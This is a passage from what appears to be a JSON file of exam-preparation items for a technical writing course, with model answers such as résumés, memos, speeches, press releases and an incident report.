affiliate at Baneshwor with 1,200 students, established in 2005.\n\nEnds."},"tw-78":{"u":8,"logic":"Tests whether you can turn a degree into a one-page marketing document. Format and quantified evidence matter far more than the list of courses taken.","how":"Build a combination résumé: profile, education with GPA, projects with numbers, skills. If the paper says cover letter, reuse the same facts in letter form.","skel":["Name, contact, GitHub, one-line profile","Education with GPA and dates","Two projects with tools and results","Skills line, references on request"],"ans":"ARUN SHARMA\nBaneshwor, Kathmandu · 98XXXXXXXX · arun.sharma@example.com · github.com/arunsharma\n\nProfile: B.Sc. CSIT graduate (3.72/4.00) with three deployed web projects and one year of part-time industry experience. Seeking a junior developer role from March 2027.\n\nEducation\n2022–2026  B.Sc. CSIT, Tribhuvan University — 3.72/4.00\n2020–2022  +2 Science, St. Xavier's College — 78%\n\nProjects\nLibrary Management System (PHP, MySQL, Bootstrap) — issue and return module used by 300 students in a pilot; cut manual entry to one screen.\nResult Scraper (Python, BeautifulSoup) — automated result collection for the department, saving about six hours a week.\n\nExperience\n2025–present  Part-time Web Developer, Shikhar IT Solutions — maintained three client sites; cut one page load from 4.2 s to 1.8 s.\n\nSkills: Python, JavaScript, PHP, SQL, Git, Linux, Figma, technical documentation.\nReferences available on request."},"tw-79":{"u":9,"logic":"A speech, not an essay. The examiner looks for an address, signposting, one clear message and a formal close; written prose with no “you” fails.","how":"Open with an address and a hook, give three short points with a transition each, and close with one wish and thanks.","skel":["Address the gathering, then hook","One core message in a sentence","Three short points, signposted","Thanks and one wish to close"],"ans":"Speech at the Farewell Programme for the Outgoing Batch\nRespected Principal, dear teachers, seniors and friends,\n\nGood afternoon. A farewell is a strange ceremony: we are here to say goodbye to people we have only just learned to work with.\n\nThree years ago this hall held a hundred nervous first-semester students. Today it holds engineers, designers and — I would argue — a few tolerable public speakers. That is the message I want to leave with: none of us arrived like this. We were built here, by late submissions, by lab partners who refused to let us quit, and by teachers who marked honestly.\n\nTo our seniors: take the habit, not the marks. Take the habit of asking, of documenting, of finishing. The degree opens one door; the habit opens the rest.\n\nTo juniors: the seats you now occupy were earned by someone. Fill them.\n\nWe will miss the corridors more than the curriculum. Go well, and keep the group chat alive. Thank you."},"tw-80":{"u":10,"logic":"Tests report structure: criteria must come before options, followed by evidence and one clear recommendation. Students usually recommend first and justify later.","how":"Use a memo heading plus five sections, put the criteria table before the options, then give one prioritised recommendation with cost.","skel":["To/From/Date/Subject plus purpose","Background and problem in three lines","Criteria, then options against them","Conclusion and one recommended option","Implementation steps and cost"],"ans":"MEMORANDUM\nTo: Chief Administrative Officer, Kathmandu Metropolitan City\nFrom: Arun Sharma, IT Officer\nDate: 13 November 2026\nSubject: Recommendation on reducing queues at ward service counters\n\nPurpose: to recommend a single online appointment system for ward offices.\n\nBackground: citizens queue for hours at ward 10 for birth registration, tax payment and recommendations. A survey of 120 visitors found an average wait of 95 minutes and two visits per service.\n\nCriteria: cost, time to implement, staff training needed, citizen reach, and reliability.\n\nFindings: (a) more counters — costly, slow, no lasting gain; (b) appointments by phone — cheap but error-prone; (c) online appointment portal with SMS confirmation — moderate cost, one month to pilot, reaches smartphone users, and falls back to walk-in slots.\n\nConclusion: option (c) gives the largest reduction in waiting time per rupee.\n\nRecommendations:\n1. Pilot the portal at wards 10 and 15 for three months.\n2. Publish real-time token counts on the KMC website.\n3. Train two staff per ward and keep ten walk-in slots daily."},"tw-81":{"u":11,"logic":"An informal proposal in disguise: problem, solution, benefit, cost, approval. Emotional pleading without a costed case loses marks.","how":"Treat your parents as a funding panel. Five headings, a cost split in words, and an explicit request to approve by a date.","skel":["Problem: post-exam exhaustion, no family time","Proposal: five days, Pokhara, fixed dates","Benefits and safety plan","Cost split and my contribution","Request approval by a date"],"ans":"Proposal: A Five-Day Family Trip to Pokhara\nTo: My parents  From: Arun  Date: 13 November 2026\n\nProblem: I finish my sixth-semester exams on 28 November, and you have both worked without a break since Dashain. We have not spent a full day together since April, and I start internship applications in December.\n\nProposed solution: a five-day trip, 1–5 December, Kathmandu–Pokhara by tourist bus, staying at Lakeside. Plan: Phewa Lake and World Peace Pagoda on day two, Sarangkot sunrise on day three, Begnas and a rest day after that.\n\nBenefits: rest before the internship season, time together without anyone checking a phone, and a much cheaper trip in the off-season.\n\nCost: bus fare Rs 3,600 for two, hotel Rs 2,000 a night for four nights, food and entry about Rs 6,000 — roughly Rs 20,000 in total. I will contribute Rs 6,000 from my tuition work, and I will book refundable tickets.\n\nRequest: please confirm by 20 November so we get the off-season rate. I will handle all bookings and the itinerary."},"tw-82":{"u":4,"logic":"Tests the announcement email: a specific subject, one purpose, benefits to the reader and a clear next step. Vague subject lines are the usual failure.","how":"Write the subject line first with the programme name, state the purpose in sentence one, then three benefit bullets and a named contact.","skel":["Specific subject line","Purpose in the first sentence","Three benefits to staff","Schedule, venue, how to join","Signature with contact"],"ans":"To: All Staff\nCc: Human Resources\nSubject: New Skill-Share Programme — teach one skill, learn three\n\nDear colleagues,\n\nFrom 1 December, Shikhar IT Solutions will run a monthly Skill-Share Programme, and I would like you to join the first cohort.\n\nEach month three colleagues will run a 45-minute session on something they do well — a testing technique, a client-handling habit, a design tool. Sessions run on the last Friday, 4–5 p.m., in the training room, and are recorded for staff in Birgunj.\n\nWhy join:\n• Share experience you already have, with no preparation beyond one hour.\n• Learn practical skills that our client work actually uses.\n• Get your name on the internal skills directory, which project managers consult when staffing.\n\nSpeakers get one training day per year in return. Attendance is voluntary but counts towards your development plan.\n\nTo offer a session, reply to this email by 22 November with a title and two lines on what you will cover.\n\nRegards,\nSuman Rai\nManager, Learning and Development\nsuman.rai@shikhar.com.np"},"tw-83":{"u":4,"logic":"Memo format is the marked content: TO/FROM/DATE/SUBJECT, no salutation, purpose in line one and an action at the end. Students write it as a letter.","how":"Draw the four-line header first, state the board's decision in the opening line, then eligibility, amount and effective date.","skel":["TO/FROM/DATE/SUBJECT header","Decision in the first sentence","Who qualifies, how much, from when","How and when it is paid","Contact for queries"],"ans":"MEMORANDUM\nTO: All Employees, Nepal Distillery Ltd.\nFROM: Arun Sharma, Company Secretary\nDATE: 13 November 2026\nSUBJECT: Board approval of bonus and performance incentives\n\nThe Board of Directors, in its meeting of 11 November 2026, has approved a festival bonus and a revised incentive scheme for all employees, effective from this month.\n\nDetails:\n1. Festival bonus — one month's basic salary to every employee who has completed six months of service by 30 November.\n2. Performance incentive — up to 15 per cent of monthly basic for staff rated “exceeds expectation” in the quarterly review.\n3. Attendance allowance — Rs 1,500 a month for full attendance, paid with the December salary.\n\nPayment: the bonus will be credited with the November salary, on or before 30 November. Incentives follow each quarterly review.\n\nStaff on probation receive the attendance allowance only. Please verify your bank details with the accounts section by 20 November.\n\nFor any clarification, contact the Human Resources desk, extension 214."},"tw-84":{"u":1,"logic":"The most repeated 10-marker in this paper: definition plus characteristics. Breadth beats depth — eight named qualities with a line each.","how":"Define in one sentence, give eight characteristics with a mini example, then one line contrasting technical with creative writing.","skel":["Definition: specialised, clear, purposeful","Eight characteristics, one line each","A mini example for two of them","Close: success is reader action"],"ans":"Technical writing is writing that communicates specialised information clearly, accurately and efficiently to a specific audience for a practical purpose — to inform, instruct, persuade or record. A user manual, a lab report, a project proposal and a bug report are all technical writing.\n\nCharacteristics:\n1. Clarity — simple words, short sentences, one idea per paragraph.\n2. Conciseness — no padding; every word earns its place.\n3. Accuracy — facts, figures and units verified before release.\n4. Audience awareness — vocabulary and depth matched to the reader.\n5. Organisation — headings, lists, signposting and logical sequence.\n6. Objectivity — evidence over opinion, a neutral tone.\n7. Consistency — one term per thing, one format throughout.\n8. Visual literacy — tables, graphs and diagrams where they beat prose.\n9. Accessibility — plain language, alt text, usable by a non-expert.\n10. Action orientation — the reader can do something after reading.\n\nUnlike creative writing, which aims to move a reader, technical writing is judged by whether the reader completes the task correctly and without help."},"tw-85":{"u":2,"logic":"Tests audience awareness: the same project described for insiders and for outsiders. Students write only for the boss and forget the external reader entirely.","how":"Split the page in two: internal examples on the left, external on the right, and show how language and detail change between them.","skel":["Claim: audience decides form and detail","Internal: memo, progress report, wiki","External: manual, proposal, press release","Same project written two ways","Rule: match vocabulary to the reader"],"ans":"The claim is true: audience, not subject, decides the form. A single project generates both kinds of document.\n\nInternal audiences — colleagues, managers, the board. They share context, so the writing is short, technical and action-oriented.\n• A memo announcing a server migration.\n• A weekly progress report to the project manager.\n• An incident report after a failed deployment.\n• A wiki page for the development team.\n\nExternal audiences — customers, regulators, suppliers, the public. They lack context, so the writing defines terms, explains benefit and limits liability.\n• A user manual for the released app.\n• A proposal submitted to a client or donor.\n• A press release about the product launch.\n• A privacy policy and terms of service.\n\nExample: the same database upgrade is “we moved to PostgreSQL 16 and cut query time by 40 per cent” internally, but “your reports now load faster and no action is needed” for customers.\n\nSo the writer changes vocabulary, depth and tone while keeping the facts identical."},"tw-86":{"u":6,"logic":"Tests whether you know web readers scan. Generic “use simple language” answers miss every medium-specific rule the examiner is looking for.","how":"Open with “readers scan, they do not read”, then ten rules as bullets — inverted pyramid, chunking, links, mobile, accessibility.","skel":["Readers scan; write for scanning","Inverted pyramid and chunking","Headings, bullets, front-loaded keywords","Links, mobile-first, speed, accessibility","Test with five real users"],"ans":"Web readers scan; they arrive from a search result, judge the page in seconds and leave. Writing for the web means designing for that behaviour.\n\n• Inverted pyramid — answer and conclusion first, background last.\n• Chunking — one idea per section; one page does one task.\n• Scannable layout — meaningful headings, bullets, bold keywords, paragraphs of two to four lines.\n• Front-load keywords in headings and link text: “download the 2082 syllabus”, never “click here”.\n• Plain style — active voice, second person, short sentences, jargon glossed once.\n• Mobile-first — readable at 360 pixels, no horizontal scroll, large tap targets.\n• Fast and light — compressed images, alt text, lazy loading.\n• Accessible — contrast, resizable text, captions, keyboard navigation.\n• Trustworthy — visible date, author, source, contact and privacy policy.\n• SEO basics — descriptive title tag, meta description, one H1, clean URL.\n\nFinally, test the page with five real users and fix whatever they misread; on the web, usability is the proof of good writing."},"tw-87":{"u":7,"logic":"Definition plus process. The steps carry the marks; a definition alone earns about two of the five.","how":"One-sentence definition, then six numbered steps in the order you would actually produce and send the release.","skel":["Definition: written for journalists","Find the news angle","Headline, release line, media contact","Dateline and five-W lead","Quote, boilerplate, one page"],"ans":"A press release is a short factual statement written for journalists, announcing something newsworthy about an organisation so that it can be printed or broadcast as news.\n\nSteps:\n1. Decide the news angle and the single message.\n2. Write a specific headline, then “FOR IMMEDIATE RELEASE” and a media contact.\n3. Open with a dateline and a lead answering who, what, when, where and why.\n4. Add two short body paragraphs: detail, one quotable quote, context.\n5. Close with an “About us” boilerplate and contact details.\n6. Keep it to one page, third person, no hype; proofread and send with a photograph."},"tw-88":{"u":3,"logic":"A personal essay that tests narrative organisation: how knowledge was acquired, in stages, with evidence of deliberate learning rather than a list of facts.","how":"Pick one narrow skill and give three stages — first attempt, the failure, deliberate practice — then one line on what it taught you.","skel":["Name the skill and how it started","The failure that taught most","Deliberate practice and sources","What the process taught about learning"],"ans":"How I Learned Linux\n\nMy knowledge of Linux came from breaking it, not from a book.\n\nIt began when a senior installed Ubuntu on my laptop. Within a week I had deleted the desktop environment. Reinstalling it took four hours and taught me more than a month of lectures: what a package manager does, why /etc matters, what a bootloader is.\n\nThen small jobs: host a site, share a printer, back up with rsync. Each failure sent me to man pages, forums and YouTube, and I kept a notebook of every command that worked.\n\nA cyber-café job made it real: I was paid to fix what I had broken. Teaching a junior later fixed the ideas.\n\nWhat I learned: break things deliberately, keep notes, and explain them to someone else."},"tw-89":{"u":4,"logic":"A persuasive internal letter: request, justification with evidence, and a specific ask. Complaining without a proposal is the common failure.","how":"Three paragraphs — purpose, evidence of extra effort, concrete proposal. Respectful tone, never accusatory.","skel":["Letter parts: date, inside address, salutation","Para 1: purpose of writing","Para 2: evidence of performance","Para 3: specific proposal and meeting request"],"ans":"13 November 2026\n\nThe Human Resources Manager\nHimalayan Softworks, Lalitpur\n\nDear Sir/Madam,\n\nSubject: Request to review incentives for high-performing staff\n\nI am writing on behalf of the development team to request a review of the current incentive scheme.\n\nIn the last two quarters the team delivered three client projects on schedule, including the e-banking module that halved processing time. Two developers regularly work evenings before release, yet the incentive ceiling has not changed since 2080.\n\nA performance-linked revision — for example a quarterly bonus tied to on-time delivery — would retain these staff and show that extra effort is noticed. I would be glad to share the delivery data and discuss options at your convenience.\n\nSincerely,\nArun Sharma\nTeam Leader, Development"},"tw-90":{"u":7,"logic":"Tests factual incident reporting: what, when, where, effect, cause, action. Blame, speculation and emotion are penalised; headings earn structure marks.","how":"Use five headings — incident, effect, cause, action taken, recommendation — and keep every sentence factual and dated.","skel":["Header: to, from, date, subject","What, when, where in three lines","Effect and cost","Cause found by the electrician","Action taken and recommendation"],"ans":"INCIDENT REPORT: Power failure in Computer Lab 2\nTo: Head of Department  From: Lab In-charge  Date: 13 November 2026\n\nIncident: At 11:40 a.m. on 12 November the mains supply failed during the seventh-semester DBMS practical. The UPS carried the server but not the thirty desktops, which shut down. Supply returned at 12:25 p.m.\n\nEffect: Two students lost unsaved work; the 1 p.m. practical was postponed an hour. No injury or damage.\n\nCause: The lab's UPS battery bank is rated for fifteen minutes and is four years old; two cells are dead.\n\nAction taken: The practical was rescheduled and students informed by notice. A ten-minute save reminder was issued.\n\nRecommendation: Replace the battery bank this month and add a data-saving reminder to the lab notice board."},"tw-91":{"u":4,"logic":"A persuasive email to a captive audience: the ask must be voluntary and visibly two-sided, or it reads as exploitation and loses the goodwill marks.","how":"Give the business reason, then the personal benefit, then the opt-out, in that order. One screen, one decision.","skel":["Subject naming the proposal","Reason: the release schedule","Benefit to company and to staff","Voluntary, deadline, who to tell"],"ans":"To: All Staff\nCc: Operations\nSubject: Proposal — two optional extra hours a week for six weeks\n\nDear colleagues,\n\nWe have four client releases between now and Poush. To protect quality and avoid weekend working later, I am proposing two optional extra hours a week — Wednesdays, 5 to 7 p.m. — for six weeks.\n\nFor the company, that is about three hundred extra hours — enough to clear the backlog without new hires.\n\nFor you, every extra hour is paid at 1.5 times, counts towards the annual review, and earns one compensatory day per twelve hours.\n\nThis is entirely voluntary; no one's rating depends on it.\n\nTo join, tell your team lead by Friday; raise any scheduling difficulty with me directly.\n\nThank you,\nSuman Rai\nManager, Shikhar IT Solutions"},"tw-92":{"u":7,"logic":"A second press release, so the repeat is a sure shot. Marked on inverted pyramid and third person, not on the size of the achievement.","how":"Reuse the release template: headline, dateline, five-W lead, one quote, boilerplate. This repeats tw-77 — a guaranteed question.","skel":["Release line and press contact","Headline naming the achievement","Dateline and five-W lead","One quote from a named person","Boilerplate, then Ends"],"ans":"FOR IMMEDIATE RELEASE\nContact: Arun Sharma, 98XXXXXXXX, pr@xyzcollege.edu.np\n\nXYZ College Team Wins National Student Hackathon\n\nKathmandu, 13 November 2026 — A four-member team from XYZ College won first place at the National Student Hackathon held at Pulchowk on Saturday, beating sixty-two teams from across Nepal.\n\nThe team built “Sahayatri”, an app that reports road obstructions and suggests alternative routes for ambulances. The judges praised the working prototype and its use of open municipal data.\n\n“We built it in thirty-six hours, and every member wrote code,” said team leader Sabina Karki.\n\nThe team receives Rs 1,00,000 and a six-month incubation offer from the organiser. The college will felicitate them on 20 November.\n\nAbout XYZ College: a Tribhuvan University affiliate at Baneshwor, established in 2005.\n\nEnds."},"tw-93":{"u":1,"logic":"Tests instructional writing: numbered steps, imperative verbs, one action per step, and warnings where the reader could waste money or time.","how":"Eight numbered imperatives, verb first, no paragraphs and no encouragement. Name one concrete resource per step.","skel":["Title: how to begin a career in IT","Numbered steps, verb first","One action per step","A warning at the risky step"],"ans":"How to Begin a Career in IT\n\n1. Finish +2 Science with Mathematics, then B.Sc. CSIT, BCA or BE Computer.\n2. Choose one language for a year — Python or JavaScript. Code daily, even twenty minutes.\n3. Build three showable projects: a CRUD web app, a small API, one tool you use.\n4. Learn Git and GitHub, the command line, SQL, one cloud free tier.\n5. Publish: a GitHub profile and a one-page portfolio beat a list of course names.\n6. Practise interviews — data structures, an hour a day for two months.\n7. Apply before you feel ready: internships, micro-jobs, campus IT support.\n8. Join a community: meetups, open-source issues, a senior who reviews your code.\n\nNever pay for a “guaranteed job” course; employers test what you can build."},"tw-94":{"u":8,"logic":"Format recall: reverse chronological order, dates at the left margin, quantified bullets. Fancy design and photographs are penalised, not rewarded.","how":"Five blocks only — contact, objective, education, experience, skills — newest first, with a number in every experience bullet.","skel":["Contact line and one-line objective","Education newest first, with GPA","Experience: action verb plus result","Projects and skills lines","References on request"],"ans":"ARUN SHARMA\nBaneshwor, Kathmandu · 98XXXXXXXX · arun.sharma@example.com · github.com/arunsharma\n\nObjective: Junior software developer, available from March 2027.\n\nEducation\n2022–2026  B.Sc. CSIT, Tribhuvan University — 3.72/4.00\n2020–2022  +2 Science, St. Xavier's College — 78%\n\nExperience\n2025–present  Part-time Web Developer, Shikhar IT Solutions\n• Built and maintained three client websites in PHP and MySQL.\n• Cut one client's page load time from 4.2 s to 1.8 s.\n2024  IT Support Intern, XYZ College\n• Maintained forty lab machines and wrote a setup guide still in use.\n\nProjects\nLibrary Management System — PHP, MySQL, Bootstrap.\nResult Scraper — Python, BeautifulSoup.\n\nSkills: Python, JavaScript, PHP, SQL, Git, Linux, Figma.\nReferences available on request."},"tw-95":{"u":9,"logic":"A speech with a defined audience and occasion. The examiner checks a formal address, a welcome, one message and an invitation to the guest of honour.","how":"Open with a titled address, give the fair's purpose in one line and one concrete example, then invite the Chief Guest to inaugurate.","skel":["Address the dignitaries by title","Purpose of the fair in one sentence","One concrete example of growth","Thanks to sponsors and volunteers","Invite the Chief Guest to open it"],"ans":"Speech at the Inaugural Session of the College IT Fair\nRespected Chief Guest, Principal, teachers, friends,\n\nGood morning. On behalf of the committee, I welcome you to the third College IT Fair.\n\nWe began with eleven projects on four tables. Today thirty-two teams from six colleges show work that solves real problems: a bus-tracking app for Ratna Park and a Nepali handwriting reader.\n\nThat growth is the point: a fair makes our work public, and public work gets better. It also puts a first-year student beside a final-year team, and a recruiter beside both.\n\nOver two days, please ask hard questions. Exhibitors, explain your code, not your slides.\n\nI thank our sponsors and volunteers. I now request the Chief Guest to inaugurate the fair and declare it open.\n\nThank you."}};
